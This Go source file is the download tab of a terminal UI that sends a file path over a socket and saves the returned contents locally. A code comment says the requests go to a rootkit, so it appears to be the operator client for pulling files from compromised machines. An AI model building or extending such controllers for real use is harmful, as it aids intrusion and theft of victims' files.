package model

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"cli/server"

	"github.com/charmbracelet/bubbles/textinput"
	tea "github.com/charmbracelet/bubbletea"
)

type DownloadModel struct {
	srv       *server.Server
	locked    *bool
	isLoading *bool
	logs      *LogsModel
	isDoing   *bool
	prompt    *textinput.Model
	// file      *os.File
}

type (
	DownloadStartCmd int
	DownloadDoneCmd  int
)

func NewDownloadModel(cfg TabCfg) *DownloadModel {
	b := false
	ti := textinput.New()
	ti.Placeholder = "File path"
	ti.Focus()
	ti.CharLimit = 156
	ti.Width = *cfg.width - 12
	ti.PromptStyle.Height(1)
	m := DownloadModel{
		srv:       cfg.srv,
		locked:    cfg.locked,
		isLoading: cfg.isLoading,
		isDoing:   &b,
		logs:      cfg.logs,
		prompt:    &ti,
		// file:      nil,
	}

	return &m
}

func (m DownloadModel) Init() tea.Cmd {
	return nil
}

func (m DownloadModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmds []tea.Cmd
	switch msg := msg.(type) {
	case tea.KeyMsg:
		if msg.String() == "enter" {
			input := m.prompt.Value()
			if !*m.isLoading && !*m.isDoing && input != "" {
				// Try to create file on client-side before making request to rootkit
				f, err := os.Create(fmt.Sprintf("%s_%s", filepath.Base(input), time.Now().Format("01-02-2006")))
				if err != nil {
					m.logs.Append(fmt.Sprintf("download: failed to create new file: %v\n", err))
				} else {
					cmds = append(cmds, tea.Sequence(m.startDownloadCmd(input), m.waitForDownloadResultCmd(f, input)))
					m.prompt.Reset()
				}
			} else {
				m.logs.Append("download: another command is already running\n")
			}
		} else {
			var cmd tea.Cmd
			*m.prompt, cmd = m.prompt.Update(msg)
			cmds = append(cmds, cmd)
		}
	}
	return m, tea.Batch(cmds...)
}

func (m DownloadModel) View() string {
	if m.srv.ConnState != server.Connected {
		return "Not connected.\n"
	}
	s := strings.Builder{}

	s.WriteString("\n\n\t\t\tType the path of the file you want to download\n\n\n")
	s.WriteString(m.prompt.View())

	return s.String()
}

func (m DownloadModel) startDownloadCmd(input string) tea.Cmd {
	return func() tea.Msg {
		if *m.isLoading || m.srv.ConnState != server.Connected {
			m.logs.Append("Download: not connected\n")
			return nil
		}

		conn := *m.srv.Sock
		_, err := fmt.Fprintf(conn, "4 %s\n", input)
		if err != nil {
			return ConnectionUpdateMsg(server.Disconnected)
		}

		*m.isDoing = true
		*m.isLoading = true
		return DownloadStartCmd(1)
	}
}

func (m *DownloadModel) waitForDownloadResultCmd(file *os.File, fileName string) tea.Cmd {
	return func() tea.Msg {
		if !*m.isDoing {
			return nil
		}
		m.logs.Append(fmt.Sprintf("no logs i guess %s\n", fileName))
		if file == nil {
			m.logs.Append("can't download: file is nil!\n")
			*m.isLoading = false
			*m.isDoing = false
			return DownloadDoneCmd(0)
		}
		ch := m.srv.Channel
		timer := time.NewTimer(10 * time.Second)
		content := ""
		wr := bufio.NewWriter(file)
	loop:
		for {
			select {
			case msg, ok := <-ch:
				if ok {
					switch msg {
					case "DONE\n":
						m.logs.Append("Download finished\n")
						break loop
					case "OK\n":
						m.logs.Append("Download started\n")
						continue
					default:
						content += msg
					}
				} else {
					m.logs.Append("download canceled\n")
					break loop
				}
			case <-timer.C:
				m.logs.Append("download timed out\n")
				break loop
			}
		}
		_, err := wr.WriteString(content)
		if err != nil {
			m.logs.Append(fmt.Sprintf("couldnt write to file: %s\n", err.Error()))
		}
		if err = wr.Flush(); err != nil {
			m.logs.Append(fmt.Sprintf("couln't flush: %s\n", err.Error()))
		}
		file.Close()
		*m.isLoading = false
		*m.isDoing = false
		return DownloadDoneCmd(1)
	}
}
